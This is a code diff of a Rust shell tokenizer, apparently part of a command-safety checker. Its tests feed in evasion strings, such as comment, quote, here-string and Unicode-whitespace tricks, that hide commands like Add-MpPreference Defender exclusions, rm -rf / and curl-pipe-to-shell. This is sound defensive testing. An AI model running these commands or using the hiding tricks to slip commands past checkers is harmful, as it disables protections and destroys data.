+            .next()
+            .is_none_or(|line| line.trim().is_empty());
+        let token_start = if chars.get(i) == Some(&'@') { i + 1 } else { i };
+        let is_rem = chars
+            .get(token_start..token_start.saturating_add(3))
+            .is_some_and(|prefix| {
+                prefix
+                    .iter()
+                    .collect::<String>()
+                    .eq_ignore_ascii_case("rem")
+            })
+            && chars
+                .get(token_start + 3)
+                .is_none_or(|ch| ch.is_ascii_whitespace());
+        let is_label = chars.get(token_start) == Some(&':');
+        if at_physical_line_start && (is_rem || is_label) {
+            while i < len && chars[i] != '\n' {
+                i += 1;
+            }
+            continue;
+        }
         let ch = chars[i];
         match ch {
             // Caret escaping (cmd.exe escape character)
@@ -437,7 +1159,19 @@ fn tokenize_cmd(input: &str) -> Vec<Segment> {
                 }
                 continue;
             }
-            '|' => {
+            '(' => {
+                paren_depth = paren_depth.saturating_add(1);
+                current.push(ch);
+                i += 1;
+                continue;
+            }
+            ')' if paren_depth > 0 => {
+                paren_depth -= 1;
+                current.push(ch);
+                i += 1;
+                continue;
+            }
+            '|' if paren_depth == 0 => {
                 if i + 1 < len && chars[i + 1] == '|' {
                     push_segment(
                         &mut segments,
@@ -463,7 +1197,7 @@ fn tokenize_cmd(input: &str) -> Vec<Segment> {
                 }
                 continue;
             }
-            '&' => {
+            '&' if paren_depth == 0 => {
                 if i + 1 < len && chars[i + 1] == '&' {
                     push_segment(
                         &mut segments,
@@ -489,7 +1223,7 @@ fn tokenize_cmd(input: &str) -> Vec<Segment> {
                 }
                 continue;
             }
-            '\n' => {
+            '\n' if paren_depth == 0 => {
                 push_segment(
                     &mut segments,
                     &current,
@@ -518,13 +1252,23 @@ fn tokenize_cmd(input: &str) -> Vec<Segment> {
     segments
 }
 
-/// Push a tokenized segment into `segments`, trimming leading/trailing
-/// whitespace and locating the trimmed content in `input` to populate
+/// Push a tokenized segment into `segments`, trimming leading/trailing shell
+/// syntax whitespace and locating the trimmed content in `input` to populate
 /// `byte_range`.
 ///
 /// `search_cursor` is advanced past the pushed segment so subsequent
 /// searches skip already-consumed bytes (handles duplicate segments like
 /// `foo | foo` correctly).
+fn push_posix_segment(
+    segments: &mut Vec<Segment>,
+    raw: &str,
+    preceding_sep: Option<String>,
+    input: &str,
+    search_cursor: &mut usize,
+) {
+    push_segment_impl(segments, raw, preceding_sep, input, search_cursor, true);
+}
+
 fn push_segment(
     segments: &mut Vec<Segment>,
     raw: &str,
@@ -532,7 +1276,26 @@ fn push_segment(
     input: &str,
     search_cursor: &mut usize,
 ) {
-    let trimmed = raw.trim();
+    push_segment_impl(segments, raw, preceding_sep, input, search_cursor, false);
+}
+
+fn push_segment_impl(
+    segments: &mut Vec<Segment>,
+    raw: &str,
+    preceding_sep: Option<String>,
+    input: &str,
+    search_cursor: &mut usize,
+    preserve_posix_word_data: bool,
+) {
+    // POSIX shells do not treat Unicode Zs/Zl/Zp characters as token
+    // whitespace. Unicode `trim()` would silently rename a Bash alias/function
+    // whose command word begins or ends in NBSP. PowerShell argv is reparsed
+    // with its broader Unicode whitespace grammar after byte ranges are fixed.
+    let trimmed = if preserve_posix_word_data {
+        raw.trim_matches(is_posix_syntax_whitespace)
+    } else {
+        raw.trim()
+    };
     if trimmed.is_empty() {
         return;
     }
@@ -584,7 +1347,7 @@ fn push_segment(
 /// Check if a word looks like a shell environment variable assignment (NAME=VALUE).
 /// Must have at least one char before `=`, and the name must be alphanumeric/underscore.
 pub fn is_env_assignment(word: &str) -> bool {
-    let s = word.trim();
+    let s = word;
     if s.starts_with('-') || s.starts_with('=') {
         return false;
     }
@@ -627,8 +1390,11 @@ pub fn leading_env_assignment_values(segment_raw: &str) -> Vec<String> {
         .collect()
 }
 
-/// Split a segment into words, respecting quotes.
-fn split_words(input: &str) -> Vec<String> {
+/// Split one already-segmented command into shell words, respecting quotes.
+/// Kept crate-visible so wrapper payloads such as `env -S` can build the same
+/// canonical argv without incorrectly treating `;`/`|` as controls executed by
+/// the wrapper itself.
+pub(crate) fn split_words(input: &str) -> Vec<String> {
     let mut words = Vec::new();
     let mut current = String::new();
     let chars: Vec<char> = input.chars().collect();
@@ -757,6 +1523,283 @@ mod tests {
     }
 
     #[test]
+    fn powershell_hash_starts_a_comment_only_at_a_token_boundary() {
+        for (input, argument) in [
+            (
+                "Write-Output foo#bar; Add-MpPreference -ExclusionPath C:\\Temp",
+                "foo#bar",
+            ),
+            (
+                "Write-Output x\"y\"#z; Add-MpPreference -ExclusionPath C:\\Temp",
+                "x\"y\"#z",
+            ),
+            (
+                "Write-Output foo` #bar; Add-MpPreference -ExclusionPath C:\\Temp",
+                "foo` #bar",
+            ),
+        ] {
+            let segs = tokenize(input, ShellType::PowerShell);
+            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
+            assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
+            assert_eq!(segs[0].args, vec![argument]);
+            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+            assert_byte_ranges_match_raw(input, &segs);
+        }
+
+        let quote_only = "Write-Output \"foo\"# Set-Alias decoy Add-MpPreference\nAdd-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(quote_only, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[0].args, vec!["\"foo\""]);
+        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+        assert_byte_ranges_match_raw(quote_only, &segs);
+
+        let comment = "Write-Output safe # Set-Alias decoy Add-MpPreference\nAdd-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(comment, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
+        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+        assert_byte_ranges_match_raw(comment, &segs);
+
+        let cr_comment = "Write-Output safe # Set-Alias decoy Add-MpPreference\rAdd-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(cr_comment, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
+        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+        assert_byte_ranges_match_raw(cr_comment, &segs);
+    }
+
+    #[test]
+    fn powershell_block_comments_close_at_the_first_terminator() {
+        let input = "<# outer <# is data #>; Add-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(input, ShellType::PowerShell);
+        assert_eq!(segs.len(), 1, "{segs:?}");
+        assert_eq!(segs[0].command.as_deref(), Some("Add-MpPreference"));
+        assert_eq!(segs[0].preceding_separator.as_deref(), Some(";"));
+        assert_byte_ranges_match_raw(input, &segs);
+
+        let embedded = "Write-Output foo<#bar; Add-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(embedded, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[0].args, vec!["foo<#bar"]);
+        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+        assert_byte_ranges_match_raw(embedded, &segs);
+
+        let quote_only =
+            "Write-Output \"x\"<# ; Set-Alias decoy #>; Add-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(quote_only, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[0].args, vec!["\"x\""]);
+        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+        assert_byte_ranges_match_raw(quote_only, &segs);
+    }
+
+    #[test]
+    fn powershell_backtick_newline_joins_the_effective_command_word() {
+        for newline in ["\n", "\r", "\r\n"] {
+            let input = format!("Set-`{newline}Item Alias:Evil Add-MpPreference");
+            let segs = tokenize(&input, ShellType::PowerShell);
+            assert_eq!(segs.len(), 1, "{input:?} -> {segs:?}");
+            assert_eq!(segs[0].command.as_deref(), Some("Set-Item"));
+            assert_eq!(segs[0].args, vec!["Alias:Evil", "Add-MpPreference"]);
+            assert_byte_ranges_match_raw(&input, &segs);
+        }
+
+        let cr_statements = "Write-Output safe\rAdd-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(cr_statements, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+        assert_byte_ranges_match_raw(cr_statements, &segs);
+
+        let continued = "Invoke-`\rExpression 'Write-Output safe'";
+        let segs = tokenize(continued, ShellType::PowerShell);
+        assert_eq!(segs.len(), 1, "{segs:?}");
+        assert_eq!(segs[0].command.as_deref(), Some("Invoke-Expression"));
+        assert_eq!(
+            crate::rules::command::normalize_cmd_base(
+                segs[0].command.as_deref().unwrap_or_default(),
+                ShellType::PowerShell,
+            ),
+            "invoke-expression"
+        );
+    }
+
+    #[test]
+    fn powershell_unicode_whitespace_splits_words_without_corrupting_ranges() {
+        for separator in ['\u{00a0}', '\u{2028}', '\u{2029}'] {
+            let input = format!(
+                "{separator}Write-Output{separator}safe{separator};{separator}Add-MpPreference{separator}-ExclusionPath{separator}C:\\Temp{separator}"
+            );
+            let segs = tokenize(&input, ShellType::PowerShell);
+            assert_eq!(segs.len(), 2, "U+{:04X}: {segs:?}", separator as u32);
+            assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
+            assert_eq!(segs[0].args, vec!["safe"]);
+            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+            assert_eq!(segs[1].args, vec!["-ExclusionPath", "C:\\Temp"]);
+            assert_byte_ranges_match_raw(&input, &segs);
+        }
+    }
+
+    #[test]
+    fn powershell_smart_quotes_keep_contents_inert_and_suffix_visible() {
+        for (open, close) in [
+            ('\u{2018}', '\u{2019}'),
+            ('\u{2019}', '\u{2018}'),
+            ('\u{201a}', '\u{2019}'),
+            ('\u{2018}', '\u{201a}'),
+            ('\u{201b}', '\u{2019}'),
+            ('\u{2018}', '\u{201b}'),
+            ('\u{201c}', '\u{201d}'),
+            ('\u{201d}', '\u{201c}'),
+            ('\u{201e}', '\u{201d}'),
+            ('\u{201c}', '\u{201e}'),
+        ] {
+            let input = format!(
+                "Write-Output {open}literal ; Set-Alias decoy Add-MpPreference{close}; Add-MpPreference -ExclusionPath C:\\Temp"
+            );
+            let segs = tokenize(&input, ShellType::PowerShell);
+            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
+            assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
+            assert!(segs[0].raw.contains("Set-Alias decoy"));
+            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+            assert_byte_ranges_match_raw(&input, &segs);
+        }
+    }
+
+    #[test]
+    fn powershell_here_strings_accept_header_space_and_matching_quote_classes() {
+        for (open, close) in [
+            ('\'', '\''),
+            ('"', '"'),
+            ('\u{2018}', '\u{2019}'),
+            ('\u{2019}', '\u{201a}'),
+            ('\u{201c}', '\u{201d}'),
+            ('\u{201d}', '\u{201e}'),
+        ] {
+            let input = format!(
+                "Write-Output @{open} \t\r\nliteral {close} }} ; Set-Alias decoy Add-MpPreference\r\n{close}@; Add-MpPreference -ExclusionPath C:\\Temp"
+            );
+            let marker = input.find('@').expect("here-string marker");
+            let here_string = powershell_here_string(&input, marker)
+                .unwrap_or_else(|| panic!("here-string was not parsed: {input:?}"));
+            assert_eq!(here_string.kind, powershell_quote_kind(open).unwrap());
+            assert!(input[here_string.content_start..here_string.content_end]
+                .contains("Set-Alias decoy"));
+
+            let segs = tokenize(&input, ShellType::PowerShell);
+            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
+            assert_eq!(segs[0].command.as_deref(), Some("Write-Output"));
+            assert!(segs[0].raw.contains("Set-Alias decoy"));
+            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+            assert_byte_ranges_match_raw(&input, &segs);
+        }
+
+        assert!(powershell_here_string("@\u{201c}\nvalue\n\u{2019}@", 0).is_none());
+        assert!(powershell_here_string("@\"not-a-header\nvalue\n\"@", 0).is_none());
+    }
+
+    #[test]
+    fn powershell_stop_parsing_is_literal_only_until_the_physical_newline() {
+        for source in [
+            "--%", "--% ", "--%&", "--%(", "--%)", "--%,", "--%;", "--%{", "--%|", "--%}",
+        ] {
+            let indexed: Vec<(usize, char)> = source.char_indices().collect();
+            assert!(
+                powershell_stop_parsing_token(&indexed, 0, PowerShellTokenClass::Start),
+                "{source:?}"
+            );
+        }
+        let ordinary: Vec<(usize, char)> = "--%foo".char_indices().collect();
+        assert!(!powershell_stop_parsing_token(
+            &ordinary,
+            0,
+            PowerShellTokenClass::Start
+        ));
+
+        for newline in ["\n", "\r", "\r\n"] {
+            let input = format!(
+                "native.exe --% \"unterminated ; Set-Alias decoy Add-MpPreference # literal{newline}Set-Alias Real Add-MpPreference"
+            );
+            let segs = tokenize(&input, ShellType::PowerShell);
+            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
+            assert_eq!(segs[0].command.as_deref(), Some("native.exe"));
+            assert!(segs[0].raw.contains("; Set-Alias decoy"));
+            assert_eq!(segs[1].command.as_deref(), Some("Set-Alias"));
+            assert_eq!(segs[1].args, vec!["Real", "Add-MpPreference"]);
+            assert_byte_ranges_match_raw(&input, &segs);
+        }
+
+        let adjacent =
+            "native.exe --%; Set-Alias decoy Add-MpPreference\nSet-Alias Real Add-MpPreference";
+        let segs = tokenize(adjacent, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert!(segs[0].raw.contains("; Set-Alias decoy"));
+        assert_eq!(segs[1].command.as_deref(), Some("Set-Alias"));
+        assert_byte_ranges_match_raw(adjacent, &segs);
+
+        for separator in ["|", "&&"] {
+            let input = format!(
+                "native.exe --% literal # data {separator} Add-MpPreference -ExclusionPath C:\\Temp"
+            );
+            let segs = tokenize(&input, ShellType::PowerShell);
+            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
+            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+            assert_eq!(segs[1].preceding_separator.as_deref(), Some(separator));
+            assert_byte_ranges_match_raw(&input, &segs);
+        }
+
+        let quoted =
+            "native.exe --% \"literal | && ; Set-Alias decoy\"\nSet-Alias Real Add-MpPreference";
+        let segs = tokenize(quoted, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert!(segs[0].raw.contains("| && ; Set-Alias decoy"));
+        assert_eq!(segs[1].command.as_deref(), Some("Set-Alias"));
+        assert_byte_ranges_match_raw(quoted, &segs);
+
+        for (open, close) in [
+            ('"', '"'),
+            ('\u{201c}', '\u{201d}'),
+            ('\u{201e}', '\u{201c}'),
+        ] {
+            let input = format!(
+                "native.exe --% {open}literal | && ; Set-Alias decoy{close} | Add-MpPreference -ExclusionPath C:\\Temp"
+            );
+            let segs = tokenize(&input, ShellType::PowerShell);
+            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
+            assert_eq!(segs[0].command.as_deref(), Some("native.exe"));
+            assert!(segs[0].raw.contains("Set-Alias decoy"));
+            assert_eq!(segs[1].preceding_separator.as_deref(), Some("|"));
+            assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+            assert_byte_ranges_match_raw(&input, &segs);
+        }
+
+        let quote_only = "Write-Output \"x\"--%; Set-Alias decoy Add-MpPreference\nSet-Alias Real Add-MpPreference";
+        let segs = tokenize(quote_only, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert!(segs[0].raw.contains("--%; Set-Alias decoy"));
+        assert_eq!(segs[1].command.as_deref(), Some("Set-Alias"));
+        assert_byte_ranges_match_raw(quote_only, &segs);
+
+        let compound = "Write-Output x\"y\"--%; Add-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(compound, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+        assert_byte_ranges_match_raw(compound, &segs);
+
+        let control = "native.exe arg--% ; Add-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(control, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+        assert_byte_ranges_match_raw(control, &segs);
+
+        let right_boundary = "native.exe --%foo ; Add-MpPreference -ExclusionPath C:\\Temp";
+        let segs = tokenize(right_boundary, ShellType::PowerShell);
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[0].args, vec!["--%foo"]);
+        assert_eq!(segs[1].command.as_deref(), Some("Add-MpPreference"));
+        assert_byte_ranges_match_raw(right_boundary, &segs);
+    }
+
+    #[test]
     fn ps_tokenizer_splits_on_double_ampersand() {
         let segs = tokenize(
             "Get-Date && Set-ExecutionPolicy Bypass",
@@ -798,12 +1841,70 @@ mod tests {
     }
 
     #[test]
+    fn powershell_invocation_groups_keep_nested_separators_scoped() {
+        let segs = tokenize(
+            "& { Write-Output ready; Add-MpPreference -ExclusionPath C:\\Temp } ; Get-Date",
+            ShellType::PowerShell,
+        );
+        assert_eq!(segs.len(), 2, "{segs:?}");
+        assert_eq!(segs[0].command.as_deref(), Some("&"));
+        assert!(segs[0].raw.contains("Add-MpPreference"));
+        assert_eq!(segs[1].command.as_deref(), Some("Get-Date"));
+        assert_eq!(segs[1].preceding_separator.as_deref(), Some(";"));
+    }
+
+    #[test]
+    fn powershell_call_operator_after_assignment_is_not_background() {
+        let segs = tokenize(
+            "$result = & { Write-Output ready; Get-Date }",
+            ShellType::PowerShell,
+        );
+        assert_eq!(segs.len(), 1, "{segs:?}");
+        assert!(segs[0].raw.contains("& {"));
+
+        let background = tokenize("Get-Date & Get-Process", ShellType::PowerShell);
+        assert_eq!(background.len(), 2, "{background:?}");
+        assert_eq!(background[1].preceding_separator.as_deref(), Some("&"));
+    }
+
+    #[test]
     fn ps_tokenizer_background_ampersand_starts_a_new_segment() {
         let segs = tokenize("Get-Job & Get-Process", ShellType::PowerShell);
         assert_eq!(segs.len(), 2, "expected background split, got {segs:?}");
         assert_eq!(segs[0].command.as_deref(), Some("Get-Job"));
         assert_eq!(segs[1].preceding_separator.as_deref(), Some("&"));
         assert_eq!(segs[1].command.as_deref(), Some("Get-Process"));
+    }
+
+    #[test]
+    fn powershell_data_word_or_escaped_redirection_cannot_hide_background_command() {
+        for input in [
+            "Write-Output return & Add-MpPreference -ExclusionPath C:\\Temp",
+            "Write-Output `>& Add-MpPreference -ExclusionPath C:\\Temp",
+        ] {
+            let segs = tokenize(input, ShellType::PowerShell);
+            assert_eq!(segs.len(), 2, "{input:?} -> {segs:?}");
+            assert_eq!(
+                segs[1].command.as_deref(),
+                Some("Add-MpPreference"),
+                "{input:?} -> {segs:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn powershell_multiline_literals_do_not_corrupt_the_following_command() {
+        for input in [
+            "<#\n'\n#>\nAdd-MpPreference -ExclusionPath C:\\Temp",
+            "$x = @'\n'\n'@\nAdd-MpPreference -ExclusionPath C:\\Temp",
+        ] {
+            let segs = tokenize(input, ShellType::PowerShell);
+            assert_eq!(
+                segs.last().and_then(|segment| segment.command.as_deref()),
+                Some("Add-MpPreference"),
+                "{input:?} -> {segs:?}"
+            );
+        }
     }
 
     #[test]
@@ -819,6 +1920,194 @@ mod tests {
         let segs = tokenize("Write-Error boom 2>&1", ShellType::PowerShell);
         assert_eq!(segs.len(), 1, "redirection must stay intact: {segs:?}");
         assert_eq!(segs[0].args.last().map(String::as_str), Some("2>&1"));
+    }
+
+    #[test]
+    fn posix_and_fish_tokenizers_split_background_commands() {
+        for shell in [ShellType::Posix, ShellType::Fish] {
+            let segs = tokenize("echo ready & rm -rf /", shell);
+            assert_eq!(segs.len(), 2, "{shell:?}: {segs:?}");
+            assert_eq!(segs[1].command.as_deref(), Some("rm"));
+            assert_eq!(segs[1].preceding_separator.as_deref(), Some("&"));
+        }
+    }
+
+    #[test]
+    fn posix_nbsp_is_preserved_in_alias_and_function_names() {
+        for name in ["sink\u{00a0}", "sink\u{0085}", "sink\r"] {
+            let alias_input = format!("alias '{name}=bash'; echo value; {name}");
+            let segs = tokenize(&alias_input, ShellType::Posix);
+            assert_eq!(segs.len(), 3, "{alias_input:?} -> {segs:?}");
+            assert_eq!(segs[0].command.as_deref(), Some("alias"));
+            assert_eq!(segs[2].command.as_deref(), Some(name));
+            assert_eq!(segs[2].raw, name);
+            assert_byte_ranges_match_raw(&alias_input, &segs);
+
+            let function_input = format!("{name}() {{ Write-Output safe; }}; {name}");
+            let segs = tokenize(&function_input, ShellType::Posix);
+            assert_eq!(segs.len(), 2, "{function_input:?} -> {segs:?}");
+            assert!(segs[0].raw.contains("Write-Output safe;"));
+            assert_eq!(segs[1].command.as_deref(), Some(name));
+            assert_eq!(segs[1].raw, name);
+            assert_byte_ranges_match_raw(&function_input, &segs);
+        }
+
+        for prefix in ['\u{00a0}', '\u{0085}', '\u{2003}', '\r'] {
+            let name = format!("{prefix}FOO=bar");
+            let input = format!("function {name} {{ bash; }}; printf ready | {name}");
+            let segs = tokenize(&input, ShellType::Posix);
+            assert_eq!(segs.len(), 3, "{input:?} -> {segs:?}");
+            assert_eq!(segs[2].command.as_deref(), Some(name.as_str()));
+            assert!(!is_env_assignment(&name));
+            assert_byte_ranges_match_raw(&input, &segs);
+        }
+    }
+
+    #[test]
+    fn posix_comment_start_uses_effective_word_state() {
+        for input in [
+            "echo foo\u{00a0}#bar; printf ready | sink",
+            "echo foo\u{0085}#bar; printf ready | sink",
+            "echo foo\r#bar; printf ready | sink",
+            "echo foo{#bar}; printf ready | sink",
+            "echo foo}#bar; printf ready | sink",
+            ":\\\n#not-comment; printf ready | sink",
+        ] {
+            let segs = tokenize(input, ShellType::Posix);
+            assert_eq!(segs.len(), 3, "{input:?} -> {segs:?}");
+            assert_eq!(segs[1].command.as_deref(), Some("printf"));
+            assert_eq!(segs[2].command.as_deref(), Some("sink"));
+            assert_byte_ranges_match_raw(input, &segs);
+        }
+
+        let comment = "echo safe \\\n# real comment; hidden\nprintf ready | sink";
+        let segs = tokenize(comment, ShellType::Posix);
+        assert_eq!(segs.len(), 3, "{segs:?}");
+        assert_eq!(segs[1].command.as_deref(), Some("printf"));
+        assert_eq!(segs[2].command.as_deref(), Some("sink"));
+        assert_byte_ranges_match_raw(comment, &segs);
+
+        let leading_brace = "{#not-comment; printf ready | sink";
+        let segs = tokenize(leading_brace, ShellType::Posix);
+        assert_eq!(segs.len(), 3, "{segs:?}");
+        assert_eq!(segs[1].command.as_deref(), Some("printf"));
+        assert_eq!(segs[2].command.as_deref(), Some("sink"));
+        assert_byte_ranges_match_raw(leading_brace, &segs);
+
+        let closing_brace = "{ echo safe; }#not-comment; sink(){ bash; }; }\nprintf ready | sink";
+        let segs = tokenize(closing_brace, ShellType::Posix);
+        assert_eq!(segs.len(), 3, "{segs:?}");
+        assert_eq!(segs[1].command.as_deref(), Some("printf"));
+        assert_eq!(segs[2].command.as_deref(), Some("sink"));
+        assert_byte_ranges_match_raw(closing_brace, &segs);
+
+        let parameter = "echo ${#value}; printf ready | sink";
+        let segs = tokenize(parameter, ShellType::Posix);
+        assert_eq!(segs.len(), 3, "{segs:?}");
+        assert_eq!(segs[1].command.as_deref(), Some("printf"));
+        assert_eq!(segs[2].command.as_deref(), Some("sink"));
+        assert_byte_ranges_match_raw(parameter, &segs);
+
+        let escaped_dollar = "echo \\${value; printf ready | sink";
+        let segs = tokenize(escaped_dollar, ShellType::Posix);
+        assert_eq!(segs.len(), 3, "{segs:?}");
+        assert_eq!(segs[1].command.as_deref(), Some("printf"));
+        assert_eq!(segs[2].command.as_deref(), Some("sink"));
+        assert_byte_ranges_match_raw(escaped_dollar, &segs);
+    }
+
+    #[test]
+    fn posix_function_keyword_allows_only_line_continuation_splicing() {
+        let input = "func\\\ntion sink { bash; }; printf ready | sink";
+        let segs = tokenize(input, ShellType::Posix);
+        assert_eq!(segs.len(), 3, "{segs:?}");
+        assert!(segs[0].raw.contains("bash;"));
+        assert_eq!(segs[1].command.as_deref(), Some("printf"));
+        assert_eq!(segs[2].command.as_deref(), Some("sink"));
+        assert_byte_ranges_match_raw(input, &segs);
+
+        let quoted = "'func'tion sink { bash; }; printf ready | sink";
+        let segs = tokenize(quoted, ShellType::Posix);
+        assert_eq!(
+            segs.len(),
+            4,
+            "quoted text must not become the function reserved word: {segs:?}"
+        );
+        assert_eq!(segs[1].command.as_deref(), Some("}"));
+    }
+
+    #[test]
+    fn escaped_redirection_character_does_not_consume_adjacent_ampersand() {
+        for shell in [ShellType::Posix, ShellType::Fish] {
+            let input = "echo \\>& rm -rf /";
+            let segs = tokenize(input, shell);
+            assert_eq!(segs.len(), 2, "{shell:?}: {segs:?}");
+            assert_eq!(segs[1].command.as_deref(), Some("rm"));
+            assert_eq!(segs[1].preceding_separator.as_deref(), Some("&"));
+        }
+    }
+
+    #[test]
+    fn posix_ampersand_redirections_and_quotes_remain_in_one_segment() {
+        for shell in [ShellType::Posix, ShellType::Fish] {
+            for input in [
+                "echo boom 2>&1",
+                "cat 0<&1",
+                "cat 3<&-",
+                "echo boom &>combined.log",
+                "echo '&'",
+            ] {
+                let segs = tokenize(input, shell);
+                assert_eq!(
+                    segs.len(),
+                    1,
+                    "{shell:?} redirection/quote was split: {input:?} -> {segs:?}"
+                );
+            }
+
+            let segs = tokenize("cat 0<&1 & echo done", shell);
+            assert_eq!(segs.len(), 2, "{shell:?}: {segs:?}");
+            assert_eq!(segs[0].args.last().map(String::as_str), Some("0<&1"));
+            assert_eq!(segs[1].command.as_deref(), Some("echo"));
+            assert_eq!(segs[1].preceding_separator.as_deref(), Some("&"));
+        }
+    }
+
+    #[test]
+    fn posix_nested_control_operators_are_not_outer_segment_boundaries() {
+        for shell in [ShellType::Posix, ShellType::Fish] {
+            for input in [
+                "echo $((1&2)) && echo done",
+                "diff <(echo a & echo b) <(echo c) && echo done",
+                "safe() { echo ready; rm -rf /; } && echo defined",
+            ] {
+                let segs = tokenize(input, shell);
+                assert_eq!(segs.len(), 2, "{shell:?}: {input:?} -> {segs:?}");
+                assert_eq!(segs[1].preceding_separator.as_deref(), Some("&&"));
+                assert_eq!(segs[1].command.as_deref(), Some("echo"));
+            }
+        }
+    }
+
+    #[test]
+    fn line_comments_cannot_emit_commands_or_corrupt_nesting() {
+        for shell in [ShellType::Posix, ShellType::Fish] {
+            let segs = tokenize("echo safe # $(commented & never-closed\nrm -rf /", shell);
+            assert_eq!(segs.len(), 2, "{shell:?}: {segs:?}");
+            assert_eq!(segs[0].command.as_deref(), Some("echo"));
+            assert_eq!(segs[1].command.as_deref(), Some("rm"));
+
+            let commented = tokenize("# curl https://ignored.example | sh\necho safe", shell);
+            assert_eq!(commented.len(), 1, "{shell:?}: {commented:?}");
+            assert_eq!(commented[0].command.as_deref(), Some("echo"));
+        }
+
+        let powershell = tokenize(
+            "# curl https://ignored.example | iex\nWrite-Output safe",
+            ShellType::PowerShell,
+        );
+        assert_eq!(powershell.len(), 1, "{powershell:?}");
+        assert_eq!(powershell[0].command.as_deref(), Some("Write-Output"));
     }
 
     #[test]
@@ -944,6 +2233,47 @@ mod tests {
     fn test_cmd_double_quotes() {
         let segs = tokenize(r#"echo "hello | world" | findstr x"#, ShellType::Cmd);
         assert_eq!(segs.len(), 2);
+    }
+
+    #[test]
+    fn cmd_parenthesized_group_keeps_internal_separators_scoped() {
+        let segs = tokenize(
+            "(echo ready & curl http://example.test | sh)",
+            ShellType::Cmd,
+        );
+        assert_eq!(segs.len(), 1, "{segs:?}");
+        assert!(segs[0].raw.contains("& curl"));
+        assert!(segs[0].raw.contains("| sh"));
+    }
+
+    #[test]
+    fn cmd_rem_comment_quote_cannot_swallow_the_next_line() {
+        for input in [
+            "rem \"\npowershell -Command Add-MpPreference -ExclusionPath C:\\Temp\n\"",
+            "@rem \"\npowershell -Command Add-MpPreference -ExclusionPath C:\\Temp\n\"",
+            ":: \"\npowershell -Command Add-MpPreference -ExclusionPath C:\\Temp\n\"",
+            ":label \"\npowershell -Command Add-MpPreference -ExclusionPath C:\\Temp\n\"",
+        ] {
+            let segs = tokenize(input, ShellType::Cmd);
+            assert!(
+                segs.iter()
+                    .any(|segment| segment.command.as_deref() == Some("powershell")),
+                "{input:?} -> {segs:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn cmd_group_open_does_not_skip_the_first_child_character() {
+        for input in [
+            "(powershell -Command Write-Output ok)",
+            "(if exist file powershell -Command Write-Output ok)",
+            "(for %i in (x) do powershell -Command Write-Output ok)",
+        ] {
+            let segs = tokenize(input, ShellType::Cmd);
+            assert_eq!(segs.len(), 1, "{input:?} -> {segs:?}");
+            assert!(segs[0].raw.contains("powershell"), "{input:?} -> {segs:?}");
+        }
     }
 
     #[test]
